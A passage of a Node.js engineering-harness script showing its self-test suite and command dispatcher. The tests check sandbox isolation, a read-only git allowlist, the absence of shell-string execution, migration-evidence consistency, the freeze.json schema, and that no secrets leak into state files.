        advanceToVerifying(sbSkipManual, 'DATABASE_MIGRATION', ['docs/SOMETHING.md']);
        const r = runVerify(sbSkipManual, []);
        const t = readSandboxTask(sbSkipManual);
        const migVerify = t.verification.results.find((x) => x.checkId === 'npm-verify' && x.status === 'SKIP');
        return r.status === 0 && migVerify && /no matching changed paths/.test(migVerify.message)
          ? true : `not found or reason missing: ${JSON.stringify(t.verification && t.verification.results)}`;
      });

      const sbRemote = newSandbox();
      check('a REMOTE_READ_ONLY check does not run without --remote-read', () => {
        advanceToVerifying(sbRemote, 'BUG_FIX', []);
        const r = runVerify(sbRemote, ['--only', 'verify-tenant-surface-remote-read']);
        const t = readSandboxTask(sbRemote);
        const result = t.verification.results.find((x) => x.checkId === 'verify-tenant-surface-remote-read');
        return r.status === 0 && result && result.status === 'MANUAL_REQUIRED' && /explicit approval/.test(result.message)
          ? true : `unexpected: ${JSON.stringify(result)}`;
      });

      const sbInterrupt = newSandbox();
      check('interruption during a multi-check run leaves completed results durable', () => {
        advanceToVerifying(sbInterrupt, 'DATABASE_MIGRATION', ['src/App.tsx']);
        // Deliberately too short for npm-verify (a real tsc+vite build) to
        // finish, but long enough for the fast synthetic
        // migration-state-check ahead of it in the plan to complete first.
        runVerify(sbInterrupt, [], 3000);
        const t = readSandboxTask(sbInterrupt);
        const mig = t.verification.results.find((x) => x.checkId === 'migration-state-check');
        const npmv = t.verification.results.find((x) => x.checkId === 'npm-verify');
        return mig && mig.status === 'PASS' && npmv && npmv.status === 'BLOCKED'
          ? true : `mig=${mig && mig.status} npm=${npmv && npmv.status}`;
      });

      check('no secret-like values appear in any sandboxed task state produced by these tests', () => {
        for (const dir of sandboxes) {
          const p = path.join(dir, ACTIVE_TASK_FILE);
          if (!fs.existsSync(p)) continue;
          const text = fs.readFileSync(p, 'utf8');
          const hit = SECRET_PATTERNS.find((re) => re.test(text));
          if (hit) return `${p} matched suspicious pattern ${hit}`;
        }
        return true;
      });
    } finally {
      for (const dir of sandboxes) {
        try {
          fs.rmSync(dir, { recursive: true, force: true });
        } catch (e) {
          // best-effort cleanup of an OS temp dir; not fatal to the suite
        }
      }
    }

    check('the real .workspc-engineering/active-task.json was never touched by these tests', () => {
      const realTaskAfter = fs.existsSync(realTaskFile) ? fs.readFileSync(realTaskFile, 'utf8') : null;
      return realTaskBefore === realTaskAfter ? true : 'the real active-task.json changed — sandbox isolation leaked';
    });
  }

  // --- git allowlist never contains a mutating verb ---
  check('git() allowlist contains no mutating subcommand', () => {
    const forbidden = ['push', 'commit', 'apply', 'reset', 'checkout', 'clean', 'merge'];
    return !forbidden.some((f) => ALLOWED_GIT_SUBCOMMANDS.includes(f));
  });

  // --- git() wrapper actually enforces the allowlist at runtime ---
  check('git() throws on a subcommand outside the allowlist', () => {
    try {
      git(['push']);
      return 'did not throw';
    } catch (e) {
      return true;
    }
  });

  // --- no shell-string execution anywhere in the operational code above
  //     this point (self-test's own strings describing the check are
  //     deliberately excluded from the scanned range) ---
  check('operational code contains no shell:true / string-exec usage', () => {
    const full = fs.readFileSync(__filename, 'utf8');
    const operational = full.slice(0, full.indexOf('function cmdSelfTest'));
    const bad = [/shell\s*:\s*true/, /execSync\(/, /[^.]\bexec\(/];
    const hit = bad.find((re) => re.test(operational));
    return hit ? `matched ${hit}` : true;
  });

  // --- HEAD / origin-main computed here match an independently spawned check ---
  check('HEAD matches an independently spawned git rev-parse', () => {
    const viaHarness = getHead();
    const raw = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: REPO_ROOT, encoding: 'utf8' });
    const viaRaw = raw.status === 0 ? raw.stdout.trim() : null;
    return viaHarness === viaRaw && viaHarness !== null;
  });
  check('origin/main matches an independently spawned git rev-parse (or both UNKNOWN)', () => {
    const viaHarness = getOriginMain();
    const raw = spawnSync('git', ['rev-parse', 'origin/main'], { cwd: REPO_ROOT, encoding: 'utf8' });
    const viaRaw = raw.status === 0 ? raw.stdout.trim() : null;
    return viaHarness === viaRaw;
  });
  check('ahead/behind are non-negative integers or UNKNOWN, consistent with HEAD vs origin/main', () => {
    const { ahead, behind } = getAheadBehind();
    const head = getHead();
    const originMain = getOriginMain();
    if (ahead === null || behind === null) return true; // UNKNOWN is an acceptable outcome
    if (ahead < 0 || behind < 0) return false;
    if (ahead > 0 && head === originMain) return false;
    return true;
  });

  // --- migration status resolution: file existence is never sufficient ---
  check('a migration file with no evidence entry resolves to UNKNOWN, not VERIFIED_APPLIED', () => {
    const files = getMigrationFiles();
    const evidence = (loadJSON('migration-evidence.json', { entries: [] }) || { entries: [] }).entries;
    const covered = new Set();
    for (const e of evidence) {
      const range = parseMigrationRange(e.migrationRange);
      if (range) for (let n = range[0]; n <= range[1]; n++) covered.add(n);
    }
    const uncovered = files.find((f) => !covered.has(f.number));
    if (!uncovered) return true; // nothing to prove against in this repo state
    const status = resolveMigrationStatus(uncovered.number, evidence);
    return status === 'UNKNOWN';
  });
  check('migration-evidence.json entries have no overlapping ranges', () => {
    const evidence = (loadJSON('migration-evidence.json', { entries: [] }) || { entries: [] }).entries;
    const seen = new Set();
    for (const e of evidence) {
      const range = parseMigrationRange(e.migrationRange);
      if (!range) return `unparseable range: ${e.migrationRange}`;
      for (let n = range[0]; n <= range[1]; n++) {
        if (seen.has(n)) return `migration ${n} covered by two evidence entries`;
        seen.add(n);
      }
      if (!['VERIFIED_APPLIED', 'VERIFIED_UNAPPLIED', 'UNKNOWN'].includes(e.status)) return `bad status: ${e.status}`;
      if (!e.evidenceSource) return `missing evidenceSource on ${e.migrationRange}`;
    }
    return true;
  });

  // --- freeze.json schema ---
  check('freeze.json has the required fields with correct types', () => {
    const freeze = loadJSON('freeze.json', null);
    if (!freeze) return 'freeze.json missing/unreadable';
    if (typeof freeze.active !== 'boolean') return 'active is not boolean';
    if (typeof freeze.reason !== 'string' || !freeze.reason) return 'reason missing';
    if (!/^[0-9a-f]{7,40}$/i.test(freeze.productionCodeBaseline || '')) return 'productionCodeBaseline not a hash';
    return true;
  });

  // --- no secret-shaped content in committed state ---
  check('no known secret-key patterns appear in committed harness state files', () => {
    for (const file of STATE_FILES) {
      let text;
      try {
        text = fs.readFileSync(path.join(ENG_DIR, file), 'utf8');
      } catch (e) {
        continue;
      }
      const hit = SECRET_PATTERNS.find((re) => re.test(text));
      if (hit) return `${file} matched suspicious pattern ${hit}`;
    }
    return true;
  });

  // --- black-box: status --json is valid, versioned JSON ---
  check('`status --json` parses and carries a schemaVersion', () => {
    const res = spawnSync(process.execPath, [__filename, 'status', '--json'], { cwd: REPO_ROOT, encoding: 'utf8', timeout: 20000 });
    if (res.status !== 0) return `exit ${res.status}`;
    const parsed = JSON.parse(res.stdout);
    return parsed.schemaVersion === SCHEMA_VERSION;
  });

  // --- black-box: status never mutates git state or harness durable state ---
  check('`status` leaves git status and .workspc-engineering/ untouched', () => {
    const before = fs.readdirSync(ENG_DIR).sort();
    const beforeStat = before.map((f) => fs.statSync(path.join(ENG_DIR, f)).mtimeMs);
    const gitBefore = git(['status', '--porcelain']).stdout;
    spawnSync(process.execPath, [__filename, 'status', '--json'], { cwd: REPO_ROOT, encoding: 'utf8', timeout: 20000 });
    const after = fs.readdirSync(ENG_DIR).sort();
    const afterStat = after.map((f) => fs.statSync(path.join(ENG_DIR, f)).mtimeMs);
    const gitAfter = git(['status', '--porcelain']).stdout;
    return JSON.stringify(before) === JSON.stringify(after)
      && JSON.stringify(beforeStat) === JSON.stringify(afterStat)
      && gitBefore === gitAfter;
  });

  // --- untracked files are named, never opened, by this module ---
  check('getWorkingTree() never reads file contents (no fs.readFile* on tracked paths in that function)', () => {
    const src = fs.readFileSync(__filename, 'utf8');
    const fn = src.slice(src.indexOf('function getWorkingTree'), src.indexOf('function getMigrationFiles'));
    return !/readFile/.test(fn);
  });

  const failed = results.filter((r) => !r.pass);
  for (const r of results) {
    process.stdout.write(`${r.pass ? 'PASS' : 'FAIL'}: ${r.name}${r.detail ? ' — ' + r.detail : ''}\n`);
  }
  process.stdout.write(`\n${results.length - failed.length}/${results.length} passed\n`);
  if (failed.length) process.exitCode = 1;
}

function main() {
  const argv = process.argv.slice(2);
  const cmd = argv[0];
  if (cmd === 'status') return cmdStatus(argv.slice(1));
  if (cmd === 'self-test') return cmdSelfTest();
  if (cmd === 'task') return cmdTask(argv.slice(1));
  if (cmd === 'verify') return cmdVerify(argv.slice(1));
  printUsage();
  process.exitCode = 1;
}

if (require.main === module) {
  main();
}
